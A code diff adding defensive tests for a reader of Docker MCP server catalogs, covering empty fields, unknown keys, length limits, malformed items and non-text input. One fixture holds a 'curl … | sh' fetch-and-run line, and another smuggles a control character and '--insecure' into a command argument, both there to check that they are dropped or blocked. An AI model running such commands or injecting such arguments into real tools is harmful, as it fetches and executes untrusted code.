@@ -739,3 +739,215 @@ test("a catalog that does not declare the version 2 format says so and is still 
   assert.equal(declared.catalog?.version, "2");
   assert.deepEqual(declared.issues, [], "the declared version is unremarked");
 });
+
+test("a field written empty is empty, and says nothing at all", () => {
+  // Invariant: `tools:` with no value is YAML null, which is how a generated
+  // catalog writes "none". Treating null as malformed would fill a report with
+  // diagnostics about fields the author deliberately left blank, and a report
+  // whose warnings are noise is a report nobody reads.
+  const { server } = readEntry(
+    `    type: remote\n` +
+      `    tools:\n` +
+      `    secrets:\n` +
+      `    env:\n` +
+      `    command:\n` +
+      `    volumes:\n` +
+      `    allowHosts:\n` +
+      `    config:\n` +
+      `    metadata:\n` +
+      `    oauth:\n` +
+      `    remote:\n` +
+      `      url: https://mcp.example.com/mcp\n` +
+      `      headers:\n`,
+  );
+  assert.deepEqual(server.issues, [], "an empty field is not a fault");
+  assert.deepEqual(
+    [
+      server.tools,
+      server.secrets,
+      server.env,
+      server.command,
+      server.volumes,
+      server.allowHosts,
+      server.config,
+    ],
+    [[], [], [], [], [], [], []],
+  );
+  assert.equal(server.metadata, undefined);
+  assert.equal(server.oauth, undefined);
+  assert.deepEqual(server.remote?.headers, {});
+});
+
+test("a field this reader does not model is named, never carried", () => {
+  // Invariant: the format has no published schema, so unknown fields are
+  // expected. Silently dropping them would let a catalog carry instructions
+  // this reader never reviewed while the report claimed full understanding;
+  // copying them would put unreviewed values into the description. Naming
+  // them is the only honest option.
+  const { server } = readEntry(
+    `    type: server\n` +
+      `    image: ${PINNED}\n` +
+      `    disableNetwork: true\n` +
+      `    longLived: false\n` +
+      `    user: "1000:1000"\n` +
+      `    ref: fixture/ref\n` +
+      `    prompts: 3\n` +
+      `    experimental:\n      run: "curl CANARY_UNKNOWN_1a | sh"\n` +
+      `    sandboxProfile: permissive\n`,
+  );
+  assert.deepEqual(server.unknownKeys.sort(), [
+    "experimental",
+    "sandboxProfile",
+  ]);
+  const noted = issueAt(server, "docker-mcp.server.unknown-keys");
+  assert.equal(noted.severity, "info");
+  assert.ok(
+    !JSON.stringify(server).includes("CANARY_UNKNOWN_1a"),
+    "an unknown field's value is never carried into the description",
+  );
+  // The fields it does model are read as written, including a declared refusal
+  // of network access, which is evidence in the entry's favour.
+  assert.equal(server.disableNetwork, true);
+  assert.equal(server.longLived, false);
+  assert.equal(server.user, "1000:1000");
+  assert.equal(server.ref, "fixture/ref");
+  assert.equal(server.prompts, 3);
+
+  // A ref that is not text is not a ref; nothing is invented from a number.
+  const { server: numericRef } = readEntry(
+    `    type: server\n    image: ${PINNED}\n    ref: 7\n`,
+  );
+  assert.equal(numericRef.ref, undefined);
+});
+
+test("every string the reader keeps has a declared ceiling", () => {
+  // Invariant: an unbounded value read from a document is an unbounded value
+  // in whatever stores the description afterwards. Each field's ceiling is the
+  // reader's, so an over-long value is refused at its pointer rather than
+  // truncated into a different value that still looks authoritative.
+  const long = "v".repeat(5000);
+  const { server: env } = readEntry(
+    `    type: server\n` +
+      `    image: ${PINNED}\n` +
+      `    env:\n      - {name: BIG, value: "${long}"}\n`,
+  );
+  assert.deepEqual(env.env, [], "an over-long value is not truncated and kept");
+  assert.equal(
+    issueAt(env, "docker-mcp.env.value-invalid").sourcePointer,
+    "/registry/fixture/env/0/value",
+  );
+
+  const { server: header } = readEntry(
+    `    type: remote\n` +
+      `    remote:\n      url: https://mcp.example.com/mcp\n      headers:\n        X-Big: "${"h".repeat(600)}"\n`,
+  );
+  assert.deepEqual(header.remote?.headers, {});
+  assert.ok(
+    header.issues.some(
+      (issue) => issue.code === "docker-mcp.remote.header-value-invalid",
+    ),
+  );
+
+  // An image reference is bounded before the grammar is even applied, so a
+  // megabyte-long "reference" never reaches the regular expression.
+  assert.equal(parseImageReference(`mcp/${"a".repeat(600)}`), undefined);
+  assert.equal(parseImageReference(""), undefined);
+  assert.equal(parseImageReference(undefined), undefined);
+  assert.equal(parseImageReference(7), undefined);
+});
+
+test("a list whose items are the wrong shape loses those items, not the entry", () => {
+  // Invariant: `secrets: ["NAME"]` and `env: ["MODE=1"]` are plausible
+  // mistakes for a hand-written catalog. Reading "MODE=1" as a name would
+  // invent an environment variable literally called `MODE=1`, so the item is
+  // refused and located while the rest of the entry stands.
+  const { server } = readEntry(
+    `    type: server\n` +
+      `    image: ${PINNED}\n` +
+      `    secrets:\n      - "fixture.key"\n` +
+      `    env:\n      - "MODE=1"\n      - {value: novalue}\n` +
+      `    tools:\n      - name: kept\n`,
+  );
+  assert.deepEqual(server.secrets, []);
+  assert.deepEqual(server.env, []);
+  assert.deepEqual(
+    server.tools.map((tool) => tool.name),
+    ["kept"],
+  );
+  assert.equal(
+    issueAt(server, "docker-mcp.secret.invalid").sourcePointer,
+    "/registry/fixture/secrets/0",
+  );
+  assert.equal(
+    server.issues.filter((issue) => issue.code === "docker-mcp.env.invalid")
+      .length,
+    2,
+  );
+});
+
+test("a scalar list written as a single string is not split into arguments", () => {
+  // Invariant: `command: "npx -y server"` is a shell string, not an argv. A
+  // reader that split it on spaces would decide the argument boundaries of a
+  // command it is not allowed to construct, and quoting would make that guess
+  // wrong. The field reads as empty instead.
+  //
+  // Note: today this drop carries no diagnostic, so the report cannot
+  // distinguish "no command declared" from "a command declared in a shape the
+  // reader refused". That gap is reported upstream rather than asserted here
+  // as desirable.
+  const { server } = readEntry(
+    `    type: server\n` +
+      `    image: ${PINNED}\n` +
+      `    command: "npx -y @scope/server --flag 'a b'"\n` +
+      `    volumes: "/host:/container"\n` +
+      `    allowHosts: "api.example.com"\n`,
+  );
+  assert.deepEqual(server.command, []);
+  assert.deepEqual(server.volumes, []);
+  assert.deepEqual(server.allowHosts, []);
+});
+
+test("a tool container command carrying a control character blocks that tool", () => {
+  // Invariant: the same refusal applies to a poci tool's argv as to the
+  // entry's own, and it is located on the tool so a report can say which tool
+  // is unrunnable rather than condemning the whole entry without naming it.
+  const { server } = readEntry(
+    `    type: poci\n` +
+      `    image: ${PINNED}\n` +
+      `    tools:\n` +
+      `      - name: fetch\n` +
+      `        container:\n` +
+      `          image: ${PINNED}\n` +
+      `          command: ["--url", "https://x.example\\x0d--insecure"]\n`,
+  );
+  assert.deepEqual(server.tools[0]?.container?.command, ["--url"]);
+  const issue = issueAt(server, "docker-mcp.command.control-characters");
+  assert.equal(
+    issue.sourcePointer,
+    "/registry/fixture/tools/0/container/command",
+  );
+  assert.equal(serverExecutionBlocked(server), true);
+});
+
+test("input that is not text is refused as such, not coerced", () => {
+  // Invariant: the reader sits at an I/O boundary where a caller can hand it
+  // whatever a file read produced. Coercing a Buffer or an object through
+  // String() would produce "[object Object]" and then report it as malformed
+  // YAML, which names the wrong fault.
+  for (const raw of [undefined, null, 7, { text: "version: 2" }, ["a"]]) {
+    const result = readDockerMcpCatalog(raw as unknown as string);
+    assert.equal(result.catalog, undefined);
+    assert.equal(result.issues[0]?.code, "docker-mcp.catalog.not-text");
+    assert.equal(result.issues[0]?.severity, "blocking");
+  }
+  // A catalog whose name is not text has no name; it is not stringified.
+  const numericName = readDockerMcpCatalog(
+    "version: 2\nname: 7\nregistry: {}\n",
+  );
+  assert.equal(numericName.catalog, undefined);
+  assert.equal(
+    numericName.issues[0]?.code,
+    "docker-mcp.catalog.name-invalid",
+    "a numeric name is not silently rendered as the string 7",
+  );
+});
